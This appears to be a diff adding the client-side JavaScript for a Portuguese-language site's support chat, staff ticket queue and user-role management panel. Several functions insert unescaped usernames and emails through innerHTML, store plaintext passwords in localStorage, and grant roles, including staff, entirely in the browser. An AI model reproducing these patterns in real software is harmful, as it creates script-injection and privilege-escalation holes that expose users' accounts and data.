+        function openGlobalSupportModal() {
+            document.getElementById('global-support-modal').style.display = 'flex';
+        }
+
+        function closeGlobalSupportModal() {
+            document.getElementById('global-support-modal').style.display = 'none';
+        }
+
+        function initGuestTicket() {
+            const email = document.getElementById('support-guest-email').value.trim();
+            if(!email) return showToast("Por favor, insira um e-mail válido.");
+
+            activeGuestEmail = email;
+            let tickets = getTickets();
+            if (!tickets[email]) {
+                tickets[email] = { username: "Visitante (" + email.split('@')[0] + ")", status: 'waiting', messages: [] };
+                saveTickets(tickets);
+                realtimeChannel.postMessage({ type: 'REFRESH_TICKETS' });
+            }
+
+            document.getElementById('support-modal-title').textContent = "Conversa com Suporte";
+            document.getElementById('support-modal-desc').textContent = "Aguardando resposta do funcionário no painel administrativo.";
+            document.getElementById('support-unauth-form').style.display = 'none';
+            document.getElementById('support-unauth-chat').style.display = 'block';
+
+            setInterval(pollGuestChat, 1000);
+        }
+
+        function pollGuestChat() {
+            if (!activeGuestEmail) return;
+            let tickets = getTickets();
+            let ticket = tickets[activeGuestEmail];
+            if (!ticket) return;
+
+            let box = document.getElementById('box-msg-guest');
+            box.innerHTML = '';
+            ticket.messages.forEach(m => {
+                let div = document.createElement('div');
+                div.className = `msg ${m.sender === activeGuestEmail ? 'sent' : 'received'}`;
+                div.textContent = m.text;
+                box.appendChild(div);
+            });
+        }
+
+        function sendGuestChatMessage() {
+            let input = document.getElementById('input-msg-guest');
+            let text = input.value.trim();
+            if (!text || !activeGuestEmail) return;
+
+            let tickets = getTickets();
+            tickets[activeGuestEmail].messages.push({ sender: activeGuestEmail, text: text });
+            saveTickets(tickets);
+            input.value = '';
+            realtimeChannel.postMessage({ type: 'REFRESH_TICKETS' });
+        }
+
+        // Painel e Fila Staff
+        function pollStaffQueue() {
+            setInterval(() => {
+                if (!currentUser) return;
+                let tickets = getTickets();
+                let queueDiv = document.getElementById('staff-support-queue');
+                if(!queueDiv) return;
+                queueDiv.innerHTML = '';
+
+                Object.keys(tickets).forEach(email => {
+                    let t = tickets[email];
+                    if (t.status === 'waiting') {
+                        let div = document.createElement('div');
+                        div.className = 'support-list-item';
+                        div.innerHTML = `<span><strong>${t.username}</strong> (${email})</span> 
+                                         <button class="btn" style="width:auto; margin:0; padding:6px 12px; font-size:11px;" onclick="acceptTicket('${email}')">Abrir Chat</button>`;
+                        queueDiv.appendChild(div);
+                    }
+                });
+
+                if (activeStaffChatTarget) {
+                    let currentTicket = tickets[activeStaffChatTarget];
+                    if (currentTicket) {
+                        let box = document.getElementById('box-msg-staff');
+                        box.innerHTML = '';
+                        currentTicket.messages.forEach(m => {
+                            let div = document.createElement('div');
+                            div.className = `msg ${m.sender === 'staff' ? 'sent' : 'received'}`;
+                            div.textContent = m.text;
+                            box.appendChild(div);
+                        });
+                    }
+                }
+            }, 1000);
+        }
+
+        function acceptTicket(email) {
+            let tickets = getTickets();
+            if (tickets[email]) {
+                tickets[email].status = 'active';
+                saveTickets(tickets);
+                activeStaffChatTarget = email;
+                document.getElementById('staff-chat-target-title').textContent = `Atendendo: ${tickets[email].username}`;
+                document.getElementById('staff-chat-window').style.display = 'block';
+                realtimeChannel.postMessage({ type: 'REFRESH_TICKETS' });
+            }
+        }
+
+        function sendChatMessage(type) {
+            let tickets = getTickets();
+            if (type === 'staff' && activeStaffChatTarget) {
+                let input = document.getElementById('input-msg-staff');
+                let text = input.value.trim();
+                if (!text) return;
+                tickets[activeStaffChatTarget].messages.push({ sender: 'staff', text: text });
+                saveTickets(tickets);
+                input.value = '';
+                realtimeChannel.postMessage({ type: 'REFRESH_TICKETS' });
+            }
+        }
+
+        function renderUsersTable() {
+            let users = getUsers();
+            let tbody = document.getElementById('table-users-body');
+            if(!tbody) return;
+            tbody.innerHTML = '';
+            users.forEach(u => {
+                let tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${u.username}</td>
+                    <td>${u.email}</td>
+                    <td>
+                        <select onchange="updateUserRole('${u.email}', this.value)">
+                            <option value="free" ${u.role === 'free' ? 'selected' : ''}>Free</option>
+                            <option value="vip" ${u.role === 'vip' ? 'selected' : ''}>Vip</option>
+                            <option value="private" ${u.role === 'private' ? 'selected' : ''}>Private</option>
+                            <option value="staff" ${u.role === 'staff' ? 'selected' : ''}>Staff</option>
+                            <option value="suporte" ${u.role === 'suporte' ? 'selected' : ''}>Suporte</option>
+                        </select>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function updateUserRole(email, newRole) {
+            let users = getUsers();
+            let user = users.find(u => u.email === email);
+            if (user) {
+                user.role = newRole;
+                saveUsers(users);
+                showToast(`Cargo de ${user.username} modificado.`);
+                if(currentUser && currentUser.email === email) {
+                    currentUser.role = newRole;
+                    localStorage.setItem('logged_user_session', JSON.stringify(currentUser));
+                    enterDashboard(currentUser);
+                }
+                realtimeChannel.postMessage({ type: 'REFRESH_USERS' });
+            }
+        }
+
+        function createStaffAccount() {
+            const name = document.getElementById('staff-name').value.trim();
+            const email = document.getElementById('staff-email').value.trim();
+            const pass = document.getElementById('staff-password').value;
+            if(!name || !email || !pass) return showToast("Preencha todos os campos.");
+
+            let users = getUsers();
+            users.push({ username: name, email, password: pass, role: 'staff' });
+            saveUsers(users);
+            showToast("Funcionário adicionado.");
+            document.getElementById('staff-name').value = '';
+            document.getElementById('staff-email').value = '';
+            document.getElementById('staff-password').value = '';
+            renderUsersTable();
+            realtimeChannel.postMessage({ type: 'REFRESH_USERS' });
+        }
+
+        // Ouvinte do Canal Realtime (Sincroniza todos os celulares e computadores conectados na mesma hora)
+        realtimeChannel.onmessage = (event) => {
+            if (event.data.type === 'REFRESH_FEED') {
+                renderScriptFeed();
+            }
+            if (event.data.type === 'REFRESH_USERS') {
+                renderUsersTable();
+                // Se o cargo do próprio usuário logado mudou em outra aba, atualiza aqui
+                const session = localStorage.getItem('logged_user_session');
+                if (session && currentUser) {
+                    const parsed = JSON.parse(session);
+                    if (parsed.role !== currentUser.role) {
+                        enterDashboard(parsed);
+                    }
+                }
+            }
+        };
+
+        // Escuta também o evento storage padrão para navegadores de celulares
+        window.addEventListener('storage', (e) => {
+            if (e.key === 'uploaded_codes') renderScriptFeed();
+            if (e.key === 'app_users') renderUsersTable();
+        });
+
+        // Carregamento de Sessão Persistente
+        window.addEventListener('DOMContentLoaded', () => {
+            const session = localStorage.getItem('logged_user_session');
+            if (session) {
+                const savedUser = JSON.parse(session);
+                enterDashboard(savedUser);
+            } else {
+                renderScriptFeed();
+            }
+        });
+    </script>
+</body>
+</html>
